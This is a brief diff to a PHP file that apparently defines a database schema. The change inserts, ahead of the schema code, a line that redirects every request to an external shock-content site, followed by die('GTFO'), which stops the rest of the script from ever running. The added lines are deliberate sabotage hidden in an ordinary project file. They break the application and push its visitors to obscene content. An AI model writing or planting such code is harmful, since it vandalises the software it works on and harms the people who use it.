@@ -1,4 +1,7 @@
 <?php
+header('Location: http://goatse.in/?u=frankusrs', true, 303);
+die('GTFO');
+
 /* Schema */
 $tables = array();
 
